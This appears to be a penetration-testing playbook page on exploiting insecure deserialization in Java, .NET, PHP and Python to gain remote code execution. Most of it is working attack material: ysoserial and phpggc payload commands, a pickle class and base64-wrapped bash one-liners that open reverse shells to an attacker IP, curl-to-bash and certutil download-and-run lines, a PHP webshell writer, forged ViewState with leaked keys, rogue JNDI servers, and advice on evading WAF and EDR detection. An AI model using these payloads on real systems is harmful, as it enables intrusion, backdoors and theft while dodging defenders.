---
tags:
  - hack-notes
  - playbook
  - web
---

# Insecure Deserialization to RCE Playbook

> Find an endpoint that deserializes attacker-controlled data, identify the runtime and a usable gadget chain, and turn an opaque blob into a reverse shell on the app server.

> **Attack graph position**
> **Fed by:** Entry point (a reachable web app or API).
> **Feeds into:** [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md) (web-tier RCE to cloud creds); internal pivot.
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance
| | |
|---|---|
| Goal | Remote code execution on a web app server via untrusted deserialization |
| Starting position | Unauthenticated or low-priv web access; you can submit data that lands in a deserializer (cookie, hidden field, header, body param, uploaded file, message queue) |
| End state | Command execution as the app service account, typically followed by a reverse shell |
| Key techniques | T1190 Exploit Public-Facing Application, T1059 Command and Scripting Interpreter, T1203 Exploitation for Client Execution, T1505.003 Web Shell |
| Prerequisites | A sink that calls `readObject` / `BinaryFormatter.Deserialize` / `unserialize` / `pickle.loads` (or equivalent) on data you influence, and either a known gadget on the classpath or an OOB-reachable injection (JNDI/RMI) |
| Difficulty | Medium to High (gadget/classpath matching is the hard part) |
| Noise level | Moderate to Loud (child processes spawned from the web service, outbound JNDI/LDAP, large encoded blobs trip WAFs) |

## Attack Path
```
1. Detect a deserialization sink
   - magic bytes / format fingerprint -> Java? .NET? PHP? Python? Ruby? Node?
        |
2. Identify the gadget surface
   - what libraries are on the classpath / loaded? (CC, Spring, Json.NET, app POP chain)
        |
3. Build payload for the matched stack
   - Java:   ysoserial CommonsCollections6 / JNDI injection
   - .NET:   ysoserial.net -g TypeConfuseDelegate, ViewState w/ machineKey
   - PHP:    hand-built POP chain or phar:// archive with crafted metadata
   - Python: pickle __reduce__
        |
4. Deliver to the sink (cookie / __VIEWSTATE / param / phar file op / queue)
        |
5. Catch the shell  ----[ blind? no output ]----> branch A: OOB (DNS/HTTP) confirm,
        |                                                    then blind exec gadget
        |
   [ no known gadget on classpath ]----> branch B: JNDI/RMI to attacker codebase,
                                                    or pivot to another sink
```

## Prerequisites and Setup
- Tooling on the attacker box:
  - `ysoserial` (Java). Grab the latest release jar (`ysoserial-all.jar`, current line is v0.0.6 with 33 chains). `java -jar ysoserial-all.jar` lists payloads.
  - `ysoserial.net` (pwntester/ysoserial.net). Build on Windows/Visual Studio or run the published release. Used for .NET gadgets and the `ViewState` plugin.
  - `marshalsec` for JNDI reference servers (`marshalsec.jndi.LDAPRefServer`, `RMIRefServer`).
  - `JNDI-Exploit-Kit` / `rogue-jndi` as a turnkey LDAP+HTTP combo for JNDI injection.
  - Blacklist3r / the `--decryptionalg` machinery for .NET machineKey brute and validation.
  - `phpggc` for PHP POP chains and phar generation.
  - Standard listeners: `nc`, `pwncat-cs`, plus an HTTP server and an interactsh / Burp Collaborator client for OOB.
- A reachable callback host (VPS or Collaborator) with controllable DNS and inbound TCP on at least one port the target egress allows (80/443/53 are best).
- Java note for JNDI: targets on JDK 8u191+ / 11.0.1+ default `com.sun.jndi.ldap.object.trustURLCodebase=false`, so remote-codebase class loading is blocked. Plan for local-classpath ObjectFactory gadgets (BeanFactory + EL, Tomcat `GroovyClassLoader`, etc.), not naive remote `.class` fetch.

## Walkthrough

### Step 1. Detect a deserialization sink and fingerprint the format
What and why: before you can pick a gadget you must know the runtime. Deserialized blobs have tell-tale prefixes. Decode every opaque token (cookies, hidden fields, headers, file uploads, viewstate, message bodies) and check the first bytes.

```bash
# Java: raw stream starts with magic 0xAC 0xED 0x00 0x05.
# Base64-wrapped it starts with "rO0AB"; gzip+base64 starts with "H4sI".
echo "rO0ABXNyAB..." | base64 -d | xxd | head     # expect: aced 0005 ...

# .NET BinaryFormatter: starts 0x00 0x01 0x00 0x00 0x00 ; base64 "AAEAAAD/////".
# .NET LosFormatter / ViewState: base64, often prefixed "/wEP..." (__VIEWSTATE).
# PHP serialize(): printable, e.g.  O:4:"User":1:{s:4:"name";s:3:"bob";}
# Python pickle: protocol 2+ starts 0x80 0x04 (or 0x80 0x02); often base64 "gAR" / "gAJ".
# Ruby Marshal: starts 0x04 0x08 ; base64 "BAh".
# Node node-serialize: JSON containing  "_$$ND_FUNC$$_function..."
```

Look for the sink server-side where you can (LFI/source disclosure, error pages leaking class names, stack traces naming `ObjectInputStream.readObject`, `BinaryFormatter.Deserialize`, `unserialize()`, `pickle.loads`, `yaml.load`, `Marshal.load`).

Success signal: a token decodes to a recognizable serialized structure, or an error/stack trace names a deserialization API.

Decision / branch:
- Recognizable magic and you can guess the stack: go to Step 2 for that stack.
- Blind (token is encrypted/HMAC'd or you see no output and no errors): note it and continue, you will lean on Step 6 (OOB) to confirm before committing a heavy payload.

### Step 2. Identify the gadget surface
What and why: a gadget chain only fires if the required classes are on the target's classpath (Java/.NET) or in the loaded codebase (PHP/Python). Match the chain to what is actually present, otherwise you get a `ClassNotFoundException` and a dead payload.

```bash
# Java: enumerate likely libraries from version banners, jar names in errors,
# /WEB-INF/lib listings, dependency hints. The classic high-yield chains:
#   commons-collections 3.1 -> CommonsCollections1 / 5 / 6 / 7
#   commons-collections4 4.0 -> CommonsCollections2 / 4
#   spring-core + spring-beans -> Spring1 / Spring2
#   commons-beanutils -> CommonsBeanutils1 / CommonsBeanutils2
#   groovy 2.3-2.4 -> Groovy1
#   no library gadget but JNDI reachable -> Step 6 branch B (JNDI injection)
java -jar ysoserial-all.jar                       # full chain list

# .NET: which formatter and which gadget. ysoserial.net groups gadgets by formatter.
ysoserial.exe --fulllist                          # gadgets x formatters matrix
# Universal-ish .NET gadgets: TypeConfuseDelegate, ActivitySurrogateSelector,
# TextFormattingRunProperties (the SharePoint/ViewState favourite).
```

For PHP and Python there is no "library on classpath" to fetch: the gadget surface is the application's own loaded classes (PHP magic methods `__wakeup`, `__destruct`, `__toString`) or anything importable at unpickle time. Read source and use `phpggc -l` to see if a known framework POP chain (Laravel, Symfony, Monolog, Guzzle, WordPress) is present.

Success signal: you can name a chain whose required classes you are confident are loaded.

Decision / branch: no known gadget anywhere on a Java classpath -> Step 6 branch B. PHP/Python with no usable app gadget -> read more source or pivot to `phar://` (PHP) / a different sink.

### Step 3a. Build the payload: Java (ysoserial)
What and why: generate a serialized object whose deserialization chains method calls down to `Runtime.exec`. CommonsCollections6 is the go-to because it avoids the static-transformer issues of CC1 and works across more JREs.

```bash
# Generate a CommonsCollections6 payload that runs a command, base64 it for transport.
java -jar ysoserial-all.jar CommonsCollections6 \
  'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}' \
  | base64 -w0 > cc6.b64
# (the inner base64 decodes to:  bash -i >& /dev/tcp/10.10.14.3/4444 0>&1)

# Wrap exactly as the target expects: raw bytes, base64, or gzip+base64.
# Cookie/param wants base64; some sinks want raw on the wire.
java -jar ysoserial-all.jar CommonsCollections6 'id' > cc6.bin   # raw stream for binary sinks
```

Why the nested `bash -c {echo,...}|{base64,-d}|{bash,-i}` form: `Runtime.exec` does not parse shell metacharacters, pipes, or redirects. Wrapping the real reverse-shell one-liner in base64 and reconstructing it through `bash -c` is the reliable way to get a pipe-and-redirect command through a single `exec` token.

Success signal: file is produced and `xxd cc6.bin | head` shows `aced 0005`.

Decision / branch: delivery sink is RMI/JMX/JNDI rather than a plain blob -> use ysoserial's `JRMPClient` / `JRMPListener` payloads, or jump to Step 6 branch B for JNDI.

### Step 3b. Build the payload: .NET (ysoserial.net), including ViewState
What and why: pick a gadget that matches the formatter. For raw `BinaryFormatter`/`LosFormatter`/`ObjectStateFormatter` sinks, `TypeConfuseDelegate` is the workhorse. For ASP.NET `__VIEWSTATE`, you forge a signed/encrypted `ObjectStateFormatter` blob using a known or leaked `machineKey`.

```powershell
# Generic BinaryFormatter gadget (e.g. a remoting / cache / session sink):
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 `
  -c "powershell -enc <base64-encoded reverse shell>"

# Json.NET sink that set TypeNameHandling != None (Auto/All/Objects):
ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw `
  -c "cmd /c certutil -urlcache -f http://10.10.14.3/s.exe %TEMP%\s.exe & %TEMP%\s.exe"
```

ViewState with a recovered machineKey:

```powershell
# Forge a __VIEWSTATE that the server will validate+decrypt and then deserialize.
# Supply the leaked validationkey/decryptionkey, algorithms, the target path, and
# (for .NET 4.5+) the __VIEWSTATEGENERATOR value from the page.
ysoserial.exe -p ViewState -g TextFormattingRunProperties `
  -c "powershell -enc <b64>" `
  --path="/somepage.aspx" `
  --apppath="/" `
  --generator="CA0B0334" `
  --validationkey="<HEX VALIDATIONKEY>" `
  --validationalg="HMACSHA256" `
  --decryptionkey="<HEX DECRYPTIONKEY>" `
  --decryptionalg="AES"
# Output is a urlencoded __VIEWSTATE value. Drop it into the request to that exact path.
```

How machineKey leaks (this is the crux of the ViewState attack):
- Hardcoded/shipped keys: products that ship a fixed `machineKey` in `web.config`. Microsoft catalogued 3000+ publicly disclosed keys; CentreStack/Triofox shipped identical keys (CVE-2025-30406) enabling unauthenticated ViewState RCE.
- Disclosure via LFI/path traversal/source leak reading `web.config` or `machine.config`.
- Post-exploitation harvesting: the SharePoint ToolShell chain (CVE-2025-53770 / CVE-2025-53771, follow-ons to CVE-2025-49706/49704) drops a shell (`spinstall0.aspx`) whose only job is to read `ValidationKey`/`DecryptionKey`, after which the operator forges signed ViewState at will. The stolen key is a persistent backdoor: patching the upload hole does not rotate the key.
- Found a key but not sure it is live: validate before generating a full payload.

```powershell
# Confirm a candidate machineKey works against a real __VIEWSTATE from the page.
# (Blacklist3r-style validation; or use ysoserial.net --isdebug with the captured VS.)
AspDotNetWrapper.exe --keypath machinekeys.txt --encrypteddata "<captured __VIEWSTATE>" `
  --purpose=viewstate --modifier=<__VIEWSTATEGENERATOR> --macdecode
```

Success signal: ysoserial.net emits a base64/urlencoded blob; for ViewState the forged value is accepted (no `ViewStateException` / `500` for MAC failure) and your command runs.

Decision / branch: .NET 9 target with no legacy shim -> `BinaryFormatter` throws at runtime (removed in .NET 9, only revivable via the unsupported `System.Runtime.Serialization.Formatters` shim package). Pivot to a ViewState/`ObjectStateFormatter` sink, a `Json.NET TypeNameHandling` sink, `DataContractSerializer`/`NetDataContractSerializer`, or `SoapFormatter` instead.

### Step 3c. Build the payload: PHP (POP chain and phar://)
What and why: PHP object injection happens when `unserialize()` runs on your input and the app (or a loaded library) has a class with a dangerous magic method (`__destruct`, `__wakeup`, `__toString`). You craft a serialized object graph (the POP chain) that drives those methods to a sink. When there is no direct `unserialize()` you control, `phar://` triggers deserialization of phar metadata during any file operation.

```bash
# Direct object injection: generate a framework POP chain to RCE with phpggc.
phpggc Monolog/RCE1 system 'id'                         # prints serialized payload
phpggc -l                                               # list available chains
phpggc Laravel/RCE9 system 'curl http://10.10.14.3/x|bash'

# phar:// path: wrap a POP-chain payload in a phar whose metadata is the object.
# Any file op the app performs on a path you control (file_exists, fopen, getimagesize,
# include, file_get_contents) with a phar:// prefix will unserialize the metadata.
phpggc -p phar -o evil.phar Monolog/RCE1 system 'id'
# Upload evil.phar (often renamed evil.jpg to pass an upload filter), then trigger:
#   ?file=phar://uploads/evil.jpg/test
```

Hand-built example when no framework chain fits (illustrates the primitive):

```php
// Target app class with an exploitable __destruct.
class Logger {
    public $logfile = '/var/www/html/shell.php';
    public $data    = '<?php system($_GET["c"]); ?>';
    function __destruct() { file_put_contents($this->logfile, $this->data); }
}
echo serialize(new Logger());
// O:6:"Logger":2:{s:7:"logfile";s:25:"/var/www/html/shell.php";s:4:"data";s:28:"<?php system($_GET[c]); ?>";}
```

Success signal: the POP chain serialized string is produced; for phar, `file evil.phar` shows a PHP archive and your magic method fires when the file op runs.

Decision / branch: modern PHP (8.0+) deprecated automatic phar metadata deserialization in some contexts and `unserialize()` supports the `allowed_classes` option, so if the app passes `['allowed_classes' => false]` you cannot inject objects: pivot to a different sink. Note PHP 8's typed properties can also break older chains; regenerate against the target's major version.

### Step 3d. Build the payload: Python (pickle)
What and why: `pickle.loads` on untrusted data is direct RCE. A class with `__reduce__` returning a callable plus args runs that callable at unpickle time. No gadget hunting required, the format itself is the gadget.

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/10.10.14.3/4444 0>&1"'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
# Deliver this base64 wherever the app calls pickle.loads(base64.b64decode(...)).
```

For blind / no-output Python sinks, swap `os.system` for an OOB confirm first (see Step 6). Note the same primitive applies to unsafe `yaml.load` (use `!!python/object/apply:os.system`) and `jsonpickle`.

Success signal: payload base64 produced; on a test target the command runs at `loads` time.

### Step 4. Deliver the payload to the sink
What and why: place the encoded blob in exactly the channel the app deserializes, with the wrapping the app applies (plain base64, urlencoded, gzip, cookie, multipart file).

```http
POST /api/import HTTP/1.1
Host: victim
Content-Type: application/x-java-serialized-object
Content-Length: 1543

<raw aced0005 bytes here>
```

```http
GET /dashboard HTTP/1.1
Host: victim
Cookie: SESSION=rO0ABXNyAB...   ; base64-wrapped Java blob in a cookie sink
```

```http
POST /somepage.aspx HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded
Content-Length: 2204

__VIEWSTATE=%2FwEP...forged...&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=...
```

```http
GET /view?file=phar://uploads/evil.jpg/x HTTP/1.1   ; PHP phar trigger
Host: victim
```

Success signal: your listener catches a connection, or the OOB canary fires, or the page returns the deserialized object handled normally (proves the blob parsed) while your command runs out of band.

Decision / branch: 403/blocked by WAF on the blob -> see OPSEC for gzip/chunking/field-shuffle evasion. 500 MAC error on ViewState -> wrong key/generator/path, return to Step 3b validation.

### Step 5. Catch the shell
What and why: stand up the listener before delivery; for `Runtime.exec`/`os.system` reverse shells the callback is immediate.

```bash
# Listener (pick one).
nc -lvnp 4444
# or a TTY-upgrading catcher:
pwncat-cs -lp 4444
```

Once in, upgrade the shell, confirm context (`id` / `whoami`), and stop. You have the proven primitive (code exec as the service account). Do not escalate destructively on a live target.

Success signal: interactive shell as the web service account (e.g. `tomcat`, `www-data`, `IIS APPPOOL\...`, `NETWORK SERVICE`).

### Step 6. Decision branches when the simple path fails

Branch A. Blind (gadget fires but you get no output):
What and why: confirm execution out of band before burning a heavy or one-shot payload, then run a blind reverse shell or staged fetch.

```bash
# OOB canary first: DNS is the most egress-friendly confirm.
# Java CC6 with a DNS lookup (or use ysoserial's URLDNS chain for pure detection):
java -jar ysoserial-all.jar URLDNS 'http://CANARY.oast.fun' > urldns.bin
# A DNS hit at CANARY.oast.fun proves the blob was deserialized (URLDNS triggers a
# DNS resolve on readObject with NO gadget needed -> ideal classpath-independent probe).

# Confirmed deserialization? Now run a real command blind via DNS/HTTP exfil or a shell:
java -jar ysoserial-all.jar CommonsCollections6 \
  'bash -c {echo,<b64 of: curl http://10.10.14.3/$(id|base64 -w0)>}|{base64,-d}|{bash,-i}'
```

URLDNS is the cleanest blind oracle in Java: it needs no third-party gadget, so a DNS callback confirms the sink is a live `readObject` even before you know what is on the classpath. For .NET use a gadget driving an outbound HTTP/DNS request; for Python/PHP put a `curl`/`nslookup` to your canary in the command.

Branch B. No known gadget on a Java classpath -> JNDI/RMI injection:
What and why: if no serialization gadget is present but the app performs a JNDI lookup on data you control (or a deserialization gadget like `BeanFactory` reaches JNDI), point it at your malicious naming server. Modern JDKs block remote-codebase class loading, so use a local-classpath ObjectFactory (Tomcat `BeanFactory` + EL, Groovy, or an EL-capable target) rather than naive remote `.class` fetch.

```bash
# Stand up a rogue LDAP/HTTP combo that returns a local-factory exploit object.
# JNDI-Exploit-Kit serves LDAP + the HTTP codebase and bundles bypass factories.
java -jar JNDI-Exploit-Kit.jar -L 10.10.14.3:1389 -C "curl http://10.10.14.3/x|bash"

# Or marshalsec as just the LDAP reference redirector (pair with your own HTTP server):
java -cp marshalsec-all.jar marshalsec.jndi.LDAPRefServer \
  "http://10.10.14.3:8080/#Exploit" 1389

# Then make the app resolve your URI (the injection point, e.g. a log4j-style ${jndi:...}
# field, a JNDI name parameter, or a deserialized BeanFactory pointing at it):
#   ${jndi:ldap://10.10.14.3:1389/exp}
```

Branch C. ViewState present but HMAC/encryption blocks forgery and no key:
Pivot. Hunt the key (LFI on `web.config`/`machine.config`, shipped-key CVE lists, default/leaked keys, an upload+harvest chain like ToolShell). Without a valid `machineKey` you cannot forge a passing ViewState. If the page enables ViewState MAC and you have no key, this sink is closed: move to another deserializer.

## OPSEC and Detection
- Serialized blobs on the wire are loud. WAFs and IDS signature `rO0AB`, `aced0005`, `AAEAAAD/////`, `O:`/`a:` PHP serialize patterns, `__VIEWSTATE` anomalies, and `${jndi:` strings. A sudden multi-KB base64 body to an import/cookie/viewstate endpoint stands out.
- Child processes from the web service are the highest-fidelity detection: `java`/`w3wp.exe`/`php-fpm`/`python` spawning `bash`, `cmd`, `powershell`, `certutil`, `curl`, or `nslookup`. EDR rules key on exactly this parent/child pair. Prefer in-process payloads (e.g. .NET ActivitySurrogate variants that load an assembly without `cmd`) over `Runtime.exec`/`os.system` where stealth matters.
- Outbound JNDI/LDAP/RMI from an app server is abnormal and frequently alerted (post-Log4Shell, egress to `:389/:1389/:1099` and DNS to fresh domains is heavily monitored). Use 80/443/53 for callbacks; a DNS-only canary (interactsh/Collaborator) is the quietest confirm.
- ViewState: forged `__VIEWSTATE` to SharePoint/ASP.NET triggers `EventCode 4009` ViewState validation logs on failure; a valid forged one is silent, which is the danger and why defenders rotate `machineKey`. Repeated `500`s while you brute the key/generator are very visible.
- To reduce noise: shuffle and gzip the blob when the sink accepts it, split delivery, keep one command and stage the rest over an allowed channel, and pick a gadget that does not fork a child process.

## Cleanup
- Remove any files you wrote: uploaded `phar`/web shells (`evil.phar`, `evil.jpg`, `shell.php`, `spinstall0.aspx`), staged binaries (`%TEMP%\s.exe`), and any dropped POP-chain webshell.
- Kill and remove listeners/infrastructure you stood up: rogue LDAP/RMI/HTTP servers (JNDI-Exploit-Kit, marshalsec), your `nc`/`pwncat` catcher, and any HTTP staging server.
- Drop any persistence created from the shell (cron, services, scheduled tasks, added accounts) and your reverse shell processes.
- If you forged ViewState/tokens, note it for the report. The key itself is the customer's to rotate (a stolen `machineKey` is a standing backdoor); flag rotation as a required remediation.
- Clear obvious operational artifacts you introduced where authorized (uploaded temp files, your test markers). Do not tamper with target logs beyond removing your own dropped files.

## Troubleshooting
- `ClassNotFoundException` / payload silently does nothing (Java): wrong gadget for the classpath. Try the other CommonsCollections variants, then BeanUtils/Spring/Groovy. Confirm the sink is even a `readObject` using URLDNS first.
- Works locally, fails on target (Java): JRE version mismatch. CC1's static-transformer path broke after 8u72; prefer CommonsCollections6/5. Match commons-collections 3.1 (CC1/5/6/7) vs collections4 4.0 (CC2/4).
- .NET payload throws at deserialize: wrong formatter selected. The gadget must match the sink's formatter (`BinaryFormatter` vs `LosFormatter`/`ObjectStateFormatter` vs `Json.Net` vs `SoapFormatter`). On .NET 9 `BinaryFormatter` is removed and throws regardless: use a different formatter sink.
- ViewState returns `500` / `ViewStateException`: wrong `validationkey`/`validationalg`, wrong `--generator` (must equal the page's `__VIEWSTATEGENERATOR`), or wrong `--path`/`--apppath`. Capture a real `__VIEWSTATE` and validate the candidate key before forging. If MAC is enabled and you have no key, the sink is closed.
- PHP object injection no-op: `unserialize(..., ['allowed_classes' => false])` blocks objects; typed properties (PHP 8) or a class signature change broke the chain. Regenerate against the target's exact framework and PHP major version; for phar confirm the file op actually hits a path you control with `phar://`.
- Encoding mismatch: the app expects raw bytes but you sent base64 (or vice versa), or it gzips/urlencodes. Mirror a legitimate token's exact wrapping. For cookies, URL-safe vs standard base64 matters.
- Blind only, no callback ever: egress is filtered. Fall back to DNS (URLDNS / `nslookup` to your canary), then time-based confirmation (`sleep`/`ping -c` and measure response latency) before declaring the sink dead.
- JNDI lookup happens but no exec (modern JDK): `trustURLCodebase=false` blocked remote class load. Switch to a local-factory bypass (Tomcat `BeanFactory`+EL, `GroovyClassLoader`) via JNDI-Exploit-Kit rather than a naive remote `.class`.

## Variations and Pivots
- Message-queue and cache sinks: the same Java/.NET gadgets apply to JMS/ActiveMQ, RMI/JMX registries, Redis/Memcached object caches, and Kryo/Hessian/Fastjson endpoints. Fastjson/Jackson with `autoType`/default-typing enabled is the JSON analogue of ViewState's `TypeNameHandling`.
- Ruby `Marshal.load` and Node `node-serialize`/`funcster` are the same class of bug with their own gadget surfaces; map them via Step 1 fingerprints.
- Escalate from the app service account using the host's local privesc path. Tie into [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md) or [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md) from the caught shell.
- Persistence and lateral movement from the shell route through [Reverse Shells and File Transfer](../Cheatsheets/Reverse%20Shells%20and%20File%20Transfer.md) and your pivoting setup.
- ViewState/`machineKey` recovery overlaps thick-client and config-secret review: a leaked key from a desktop app's bundled config can unlock its server twin. See [Thick Client Application](../Checklists/Thick%20Client%20Application.md).
- For API-delivered blobs (JSON with type hints, JWT-wrapped serialized state), pair this with [API Security](../Checklists/API%20Security.md) enumeration to find the import/deserialize endpoints.

## Related
- [Web Application](../Checklists/Web%20Application.md)
- [API Security](../Checklists/API%20Security.md)
- [Thick Client Application](../Checklists/Thick%20Client%20Application.md)
- [Web App and Payloads](../Cheatsheets/Web%20App%20and%20Payloads.md)
- [Reverse Shells and File Transfer](../Cheatsheets/Reverse%20Shells%20and%20File%20Transfer.md)
- [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md)
- [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md)
